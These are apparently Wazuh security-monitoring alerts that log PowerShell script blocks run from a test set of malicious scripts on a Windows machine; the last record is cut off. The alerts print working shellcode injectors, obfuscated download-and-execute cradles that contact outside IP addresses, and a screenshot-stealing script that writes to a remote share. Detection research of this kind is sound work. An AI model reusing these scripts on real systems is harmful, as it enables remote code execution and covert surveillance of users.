{"timestamp":"2026-07-06T02:21:15.961+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":175,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304475.3771232","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:35.7959711Z","eventRecordID":"145645","processID":"8672","threadID":"5200","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$SsUQ = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $SsUQ -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x3d,0x35,0x8e,0x8e,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0x32,0xd7,0x7b,0x72,0xa4,0x95,0x84,0x8b,0x34,0xfa,0x0d,0x6e,0x05,0x3a,0x69,0xfa,0x35,0x8a,0xf9,0xae,0xb9,0x61,0xaf,0x5a,0x4a,0x07,0x78,0x6c,0xfb,0xa2,0x5e,0x43,0xfc,0x9f,0xa3,0xc2,0x7e,0xe2,0xf7,0x24,0xbf,0x2d,0x0a,0x24,0xf8,0x50,0xe7,0x74,0x51,0x1e,0x5a,0x69,0xd6,0x6a,0x67,0x02,0xa4,0x7b,0xef,0xf7,0x7c,0x7d,0xde,0xa9,0xf7,0x24,0xc0,0x48,0xd4,0x5c,0x49,0x53,0x39,0x58,0x03,0xe8,0x89,0x16,0x92,0x38,0xc0,0xd7,0x39,0x05,0xed,0x25,0x43,0x41,0xc9,0xd5,0x36,0xbb,0x2a,0x6b,0x41,0x78,0x51,0xb7,0xc4,0x9b,0xf1,0x3c,0x7e,0x40,0x00,0x90,0x19,0x03,0x0e,0x5d,0x6d,0x4b,0x12,0x60,0xa2,0xe7,0x2e,0xe9,0x45,0x28,0xa7,0xa9,0x61,0xec,0xec,0x6a,0x0b,0xb5,0x48,0xdc,0x34,0xa5,0x33,0x81,0x90,0xad,0xd9,0xd6,0xa8,0xef,0xb5,0x1b,0x81,0x0f,0x45,0x34,0x92,0x7c,0x77,0x9b,0x08,0xeb,0x3b,0x54,0x97,0xec,0x3c,0x4f,0x6f,0x62,0xc3,0x70,0x90,0xaa,0x07,0x24,0xc0,0xc4,0xae,0x45,0x8b,0x14,0x4f,0x90,0x1c,0x45,0xff,0x4b,0xdd,0x35,0xbf,0x3b,0xb5,0x5f,0x30,0x63,0xa5,0x5f,0x9b,0x0c,0x4c,0xa5,0x4b,0x1d,0xaf,0x2b,0x3a,0x09,0xcd,0x33,0x3d,0x76,0x58,0xd5,0x57,0x96,0x0d,0x4d,0xcf,0x0f,0x14,0x05,0x6e,0xcf,0x82,0x63,0xb0,0x5b,0x21,0x93,0x7e,0xac,0x4c,0x87,0x16,0x5c,0x1b,0xf5,0xb0,0x63,0xb1,0x90,0x3c,0xf6,0x3e,0x33,0x6b,0x6e,0x3d,0x62,0x5b,0x31,0xbe,0x41,0xd0,0xf8,0x2a,0x2a,0x8e,0x04,0xbb,0xaa,0x4e,0x53,0xd1,0xaa,0x26,0x03,0x81,0xf8,0x53,0x4c,0x1c,0x6d,0xc8,0xd9,0x9f,0xc4,0xbd,0x4a,0xc8,0xea,0x98,0xbd,0x57,0x14,0xcf,0x3f,0xab,0xc3,0x29,0x4a,0xc5,0xd7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CoK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CoK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CoK,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d9100a41-d859-4824-80ee-60dc97e3b7cf\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3449.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$SsUQ = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $SsUQ -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x3d,0x35,0x8e,0x8e,0xd9,0xcb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0x32,0xd7,0x7b,0x72,0xa4,0x95,0x84,0x8b,0x34,0xfa,0x0d,0x6e,0x05,0x3a,0x69,0xfa,0x35,0x8a,0xf9,0xae,0xb9,0x61,0xaf,0x5a,0x4a,0x07,0x78,0x6c,0xfb,0xa2,0x5e,0x43,0xfc,0x9f,0xa3,0xc2,0x7e,0xe2,0xf7,0x24,0xbf,0x2d,0x0a,0x24,0xf8,0x50,0xe7,0x74,0x51,0x1e,0x5a,0x69,0xd6,0x6a,0x67,0x02,0xa4,0x7b,0xef,0xf7,0x7c,0x7d,0xde,0xa9,0xf7,0x24,0xc0,0x48,0xd4,0x5c,0x49,0x53,0x39,0x58,0x03,0xe8,0x89,0x16,0x92,0x38,0xc0,0xd7,0x39,0x05,0xed,0x25,0x43,0x41,0xc9,0xd5,0x36,0xbb,0x2a,0x6b,0x41,0x78,0x51,0xb7,0xc4,0x9b,0xf1,0x3c,0x7e,0x40,0x00,0x90,0x19,0x03,0x0e,0x5d,0x6d,0x4b,0x12,0x60,0xa2,0xe7,0x2e,0xe9,0x45,0x28,0xa7,0xa9,0x61,0xec,0xec,0x6a,0x0b,0xb5,0x48,0xdc,0x34,0xa5,0x33,0x81,0x90,0xad,0xd9,0xd6,0xa8,0xef,0xb5,0x1b,0x81,0x0f,0x45,0x34,0x92,0x7c,0x77,0x9b,0x08,0xeb,0x3b,0x54,0x97,0xec,0x3c,0x4f,0x6f,0x62,0xc3,0x70,0x90,0xaa,0x07,0x24,0xc0,0xc4,0xae,0x45,0x8b,0x14,0x4f,0x90,0x1c,0x45,0xff,0x4b,0xdd,0x35,0xbf,0x3b,0xb5,0x5f,0x30,0x63,0xa5,0x5f,0x9b,0x0c,0x4c,0xa5,0x4b,0x1d,0xaf,0x2b,0x3a,0x09,0xcd,0x33,0x3d,0x76,0x58,0xd5,0x57,0x96,0x0d,0x4d,0xcf,0x0f,0x14,0x05,0x6e,0xcf,0x82,0x63,0xb0,0x5b,0x21,0x93,0x7e,0xac,0x4c,0x87,0x16,0x5c,0x1b,0xf5,0xb0,0x63,0xb1,0x90,0x3c,0xf6,0x3e,0x33,0x6b,0x6e,0x3d,0x62,0x5b,0x31,0xbe,0x41,0xd0,0xf8,0x2a,0x2a,0x8e,0x04,0xbb,0xaa,0x4e,0x53,0xd1,0xaa,0x26,0x03,0x81,0xf8,0x53,0x4c,0x1c,0x6d,0xc8,0xd9,0x9f,0xc4,0xbd,0x4a,0xc8,0xea,0x98,0xbd,0x57,0x14,0xcf,0x3f,0xab,0xc3,0x29,0x4a,0xc5,0xd7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CoK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CoK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CoK,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d9100a41-d859-4824-80ee-60dc97e3b7cf","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3449.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:16.035+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":15,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304476.3782589","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:36.6018795Z","eventRecordID":"145649","processID":"8308","threadID":"8356","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wc=NEW-ObJeCt SYsTEM.NET.WeBCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadeRS.ADD('User-Agent',$u);$Wc.PROXY = [SySTeM.NeT.WEBReQUEST]::DEFaUltWebProxY;$wC.ProXy.CReDentIaLs = [SYsTem.NeT.CreDenTiAlCAcHE]::DefaUlTNEtWorkCReDEnTiALs;$K='35knYrX*t0EiRh1$w]-&TQ/9zBWfbxoZ';$I=0;[CHaR[]]$B=([CHAr[]]($Wc.DOWNLoaDSTRing(\"http://104.145.225.3:8081/index.asp\")))|%{$_-BXOR$k[$i++%$k.LeNGTh]};IEX ($B-jOIN'')\r\n\r\nScriptBlock ID: 2ada5ca6-f27f-4f61-93d4-bc8c707f710e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3462.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wc=NEW-ObJeCt SYsTEM.NET.WeBCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadeRS.ADD('User-Agent',$u);$Wc.PROXY = [SySTeM.NeT.WEBReQUEST]::DEFaUltWebProxY;$wC.ProXy.CReDentIaLs = [SYsTem.NeT.CreDenTiAlCAcHE]::DefaUlTNEtWorkCReDEnTiALs;$K='35knYrX*t0EiRh1$w]-&amp;TQ/9zBWfbxoZ';$I=0;[CHaR[]]$B=([CHAr[]]($Wc.DOWNLoaDSTRing(\\\"http://104.145.225.3:8081/index.asp\\\")))|%{$_-BXOR$k[$i++%$k.LeNGTh]};IEX ($B-jOIN'')","scriptBlockId":"2ada5ca6-f27f-4f61-93d4-bc8c707f710e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3462.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:16.961+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":176,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304476.3786391","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:37.3801249Z","eventRecordID":"145653","processID":"8624","threadID":"2632","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$M0t = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $M0t -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xe9,0x49,0x47,0x9f,0xda,0xdc,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xc0,0xed,0xab,0xb2,0x63,0x05,0xa9,0x3d,0x9c,0xd5,0xce,0xb4,0x79,0xe4,0xce,0xa3,0x0a,0x56,0xff,0xa0,0x5f,0x5a,0x74,0xe4,0x4b,0xe9,0xf8,0x21,0x7b,0x5a,0xb6,0x17,0xb2,0x5b,0xeb,0x64,0xd5,0xdf,0xf6,0xb8,0x35,0xde,0x38,0xcd,0x34,0x27,0x24,0x3c,0x64,0xf0,0x22,0x93,0x99,0x75,0x7e,0x28,0x11,0xc5,0x6e,0x28,0xc6,0x9d,0x91,0x19,0x59,0x96,0xcb,0xb9,0x5b,0x7b,0x60,0xf0,0x43,0x98,0x4d,0x4a,0xff,0x6a,0x39,0x4d,0x29,0xa3,0xc2,0xe2,0x14,0x0c,0x31,0xfa,0x51,0xaa,0xaa,0x89,0xab,0xc9,0x57,0x8a,0x6f,0xb0,0x83,0x1f,0x74,0x12,0x47,0x87,0x50,0xa3,0x84,0x5e,0x12,0xaf,0x61,0x14,0x7c,0xb3,0x74,0xf9,0xf6,0xcf,0xfd,0xfc,0xd8,0x46,0x45,0xdb,0xfc,0x03,0x1d,0x42,0xa4,0xe9,0xf0,0x7b,0xb6,0x52,0xac,0xd9,0xbc,0x7e,0xb9,0x53,0x9f,0x16,0x0e,0x5e,0x20,0xe6,0x18,0xe9,0x53,0xd4,0x87,0x41,0xfc,0x54,0x4f,0x4c,0xfb,0x9b,0x7a,0x28,0x93,0x62,0x85,0x49,0xbd,0xa0,0xd1,0x19,0xd5,0x01,0x5a,0xf2,0x25,0xae,0x8f,0x6f,0x23,0x38,0x8a,0x07,0xcc,0x48,0x82,0xe5,0x12,0xb7,0x13,0x63,0xf4,0x97,0xc3,0x23,0xa9,0x57,0xb4,0x83,0x19,0x3f,0xde,0x0b,0x45,0x5f,0xe1,0xc1,0xee,0xf5,0x0e,0xbc,0x47,0x61,0xb6,0xe5,0x1c,0x10,0x37,0x30,0x59,0x12,0xb3,0xb7,0x9d,0xdc,0x34,0xbd,0x8d,0x88,0xb4,0x88,0xec,0x1e,0xca,0x26,0x9a,0x9e,0x5e,0xcd,0x0d,0xc9,0xf6,0xcf,0x68,0x3d,0x59,0x2f,0x5f,0x36,0x50,0xa5,0x20,0x20,0x9d,0x29,0xa1,0xb0,0xcb,0x23,0xa1,0xd8,0xab,0x17,0xf2,0xfd,0xb3,0x8d,0x66,0xae,0x21,0x2e,0xdf,0x03,0xe1,0x46,0xdd,0x7a,0xc5,0xc8,0x1e,0xa9,0xd7,0x35,0xc9,0x97,0xad,0x57,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aRV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aRV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aRV,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: ee87dda7-a96f-4e57-a327-6c2ae371bad6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3463.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$M0t = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $M0t -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xe9,0x49,0x47,0x9f,0xda,0xdc,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x58,0x13,0x03,0x58,0x13,0x83,0xc0,0xed,0xab,0xb2,0x63,0x05,0xa9,0x3d,0x9c,0xd5,0xce,0xb4,0x79,0xe4,0xce,0xa3,0x0a,0x56,0xff,0xa0,0x5f,0x5a,0x74,0xe4,0x4b,0xe9,0xf8,0x21,0x7b,0x5a,0xb6,0x17,0xb2,0x5b,0xeb,0x64,0xd5,0xdf,0xf6,0xb8,0x35,0xde,0x38,0xcd,0x34,0x27,0x24,0x3c,0x64,0xf0,0x22,0x93,0x99,0x75,0x7e,0x28,0x11,0xc5,0x6e,0x28,0xc6,0x9d,0x91,0x19,0x59,0x96,0xcb,0xb9,0x5b,0x7b,0x60,0xf0,0x43,0x98,0x4d,0x4a,0xff,0x6a,0x39,0x4d,0x29,0xa3,0xc2,0xe2,0x14,0x0c,0x31,0xfa,0x51,0xaa,0xaa,0x89,0xab,0xc9,0x57,0x8a,0x6f,0xb0,0x83,0x1f,0x74,0x12,0x47,0x87,0x50,0xa3,0x84,0x5e,0x12,0xaf,0x61,0x14,0x7c,0xb3,0x74,0xf9,0xf6,0xcf,0xfd,0xfc,0xd8,0x46,0x45,0xdb,0xfc,0x03,0x1d,0x42,0xa4,0xe9,0xf0,0x7b,0xb6,0x52,0xac,0xd9,0xbc,0x7e,0xb9,0x53,0x9f,0x16,0x0e,0x5e,0x20,0xe6,0x18,0xe9,0x53,0xd4,0x87,0x41,0xfc,0x54,0x4f,0x4c,0xfb,0x9b,0x7a,0x28,0x93,0x62,0x85,0x49,0xbd,0xa0,0xd1,0x19,0xd5,0x01,0x5a,0xf2,0x25,0xae,0x8f,0x6f,0x23,0x38,0x8a,0x07,0xcc,0x48,0x82,0xe5,0x12,0xb7,0x13,0x63,0xf4,0x97,0xc3,0x23,0xa9,0x57,0xb4,0x83,0x19,0x3f,0xde,0x0b,0x45,0x5f,0xe1,0xc1,0xee,0xf5,0x0e,0xbc,0x47,0x61,0xb6,0xe5,0x1c,0x10,0x37,0x30,0x59,0x12,0xb3,0xb7,0x9d,0xdc,0x34,0xbd,0x8d,0x88,0xb4,0x88,0xec,0x1e,0xca,0x26,0x9a,0x9e,0x5e,0xcd,0x0d,0xc9,0xf6,0xcf,0x68,0x3d,0x59,0x2f,0x5f,0x36,0x50,0xa5,0x20,0x20,0x9d,0x29,0xa1,0xb0,0xcb,0x23,0xa1,0xd8,0xab,0x17,0xf2,0xfd,0xb3,0x8d,0x66,0xae,0x21,0x2e,0xdf,0x03,0xe1,0x46,0xdd,0x7a,0xc5,0xc8,0x1e,0xa9,0xd7,0x35,0xc9,0x97,0xad,0x57,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aRV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aRV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aRV,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"ee87dda7-a96f-4e57-a327-6c2ae371bad6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3463.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:18.361+0000","rule":{"level":14,"description":"Screen capture method invoked from PowerShell script.","id":"91803","mitre":{"id":["T1113"],"tactic":["Collection"],"technique":["Screen Capture"]},"firedtimes":1,"mail":true,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304478.3797740","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:38.2012090Z","eventRecordID":"145657","processID":"3952","threadID":"2196","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$username=\"$env:UserName\"\r\nWrite-Output $username\r\n$hname=\"$env:computername\"\r\nWrite-Output $hname\r\n$i=1\r\nWhile ($i -le 5){\r\n$time=Get-Date -format \"dd-MMM-yyyy-HH-mm-ss\"\r\nWrite-Output $time\r\nif (Test-Path \\\\143.16.176.125\\x) {\r\n$File = \"\\\\143.16.176.125\\x\\\" + $username + \"_\" + $hname + \"_\" + $time + \".jpg\"\r\n}\r\nElseIf (Test-Path C:\\HP) {\r\n$File = \"C:\\HP\\\" + $username + \"_\" + $time + \".jpg\"\r\n}\r\nElseIf (Test-Path C:) {\r\n$File = \"C:\\\" + $username + \"_\" + $time + \".jpg\"\r\n}\r\nElse {\r\nexit\r\n}\r\nAdd-Type -AssemblyName System.Windows.Forms\r\nAdd-type -AssemblyName System.Drawing\r\n$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\r\n$Width = $Screen.Width\r\n$Height = $Screen.Height\r\n$Left = $Screen.Left\r\n$Top = $Screen.Top\r\n$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\r\n$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\r\n$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\r\n$bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg))\r\nWrite-Output \"Screenshot saved to:\"\r\nWrite-Output $File\r\n$graphic.dispose()\r\n$bitmap.dispose()\r\nStart-Sleep -Seconds 30\r\n$i++\r\n}\r\nexit\r\n\r\nScriptBlock ID: 80715db1-1b1a-4a7d-add6-4c75f1fb865a\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3467.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$username=\\\"$env:UserName\\\"  Write-Output $username  $hname=\\\"$env:computername\\\"  Write-Output $hname  $i=1  While ($i -le 5){  $time=Get-Date -format \\\"dd-MMM-yyyy-HH-mm-ss\\\"  Write-Output $time  if (Test-Path \\\\\\\\143.16.176.125\\\\x) {  $File = \\\"\\\\\\\\143.16.176.125\\\\x\\\\\\\" + $username + \\\"_\\\" + $hname + \\\"_\\\" + $time + \\\".jpg\\\"  }  ElseIf (Test-Path C:\\\\HP) {  $File = \\\"C:\\\\HP\\\\\\\" + $username + \\\"_\\\" + $time + \\\".jpg\\\"  }  ElseIf (Test-Path C:) {  $File = \\\"C:\\\\\\\" + $username + \\\"_\\\" + $time + \\\".jpg\\\"  }  Else {  exit  }  Add-Type -AssemblyName System.Windows.Forms  Add-type -AssemblyName System.Drawing  $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen  $Width = $Screen.Width  $Height = $Screen.Height  $Left = $Screen.Left  $Top = $Screen.Top  $bitmap = New-Object System.Drawing.Bitmap $Width, $Height  $graphic = [System.Drawing.Graphics]::FromImage($bitmap)  $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)  $bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg))  Write-Output \\\"Screenshot saved to:\\\"  Write-Output $File  $graphic.dispose()  $bitmap.dispose()  Start-Sleep -Seconds 30  $i++  }  exit","scriptBlockId":"80715db1-1b1a-4a7d-add6-4c75f1fb865a","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3467.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:18.463+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":16,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304478.3804431","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:38.9684466Z","eventRecordID":"145661","processID":"8324","threadID":"8788","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$WC=NeW-OBJEcT SysTem.NEt.WEBCLIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAders.Add('User-Agent',$u);$WC.PROXY = [SYStEM.NEt.WEBREqUESt]::DefaUltWEbProxy;$Wc.Proxy.CredENtiALs = [SyStEm.Net.CREDENTIALCacHe]::DEfAUltNEtworkCREDeNTiaLS;$K='j=5u]2coli8\\PqEOZDHCT~af+,7tI[A^';$i=0;[Char[]]$b=([cHAr[]]($wc.DOWNLOaDStRING(\"http://137.117.188.120:443/index.asp\")))|%{$_-bXor$k[$i++%$K.LEngTh]};IEX ($B-JOIn'')\r\n\r\nScriptBlock ID: 03f9269f-a2ba-4968-a00b-85db305c3071\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3471.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$WC=NeW-OBJEcT SysTem.NEt.WEBCLIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAders.Add('User-Agent',$u);$WC.PROXY = [SYStEM.NEt.WEBREqUESt]::DefaUltWEbProxy;$Wc.Proxy.CredENtiALs = [SyStEm.Net.CREDENTIALCacHe]::DEfAUltNEtworkCREDeNTiaLS;$K='j=5u]2coli8\\\\PqEOZDHCT~af+,7tI[A^';$i=0;[Char[]]$b=([cHAr[]]($wc.DOWNLOaDStRING(\\\"http://137.117.188.120:443/index.asp\\\")))|%{$_-bXor$k[$i++%$K.LEngTh]};IEX ($B-JOIn'')","scriptBlockId":"03f9269f-a2ba-4968-a00b-85db305c3071","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3471.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:19.350+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":17,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304479.3808234","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:39.7158257Z","eventRecordID":"145665","processID":"8640","threadID":"8484","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$Wc=New-OBJect SYstEm.NeT.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAders.ADD('User-Agent',$u);$wc.ProxY = [SySTeM.NET.WEBReqUest]::DEFaUltWEBPrOXy;$WC.ProXy.CrEdeNTiALS = [SysTEM.NET.CREdEnTiAlCAChE]::DeFauLtNeTwORKCrEDentialS;$K='acdbc174f599e7dbd03a21fa24b5dbf6';$I=0;[ChAr[]]$B=([chAr[]]($WC.DOWnlOaDSTrInG(\"http://78.229.133.134:80/index.asp\")))|%{$_-bXor$K[$i++%$K.LeNgTh]};IEX ($b-jOIN'')\r\n\r\nScriptBlock ID: e5d99ba0-4f2f-4467-815c-0ab3ca5f6694\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3480.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Wc=New-OBJect SYstEm.NeT.WeBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAders.ADD('User-Agent',$u);$wc.ProxY = [SySTeM.NET.WEBReqUest]::DEFaUltWEBPrOXy;$WC.ProXy.CrEdeNTiALS = 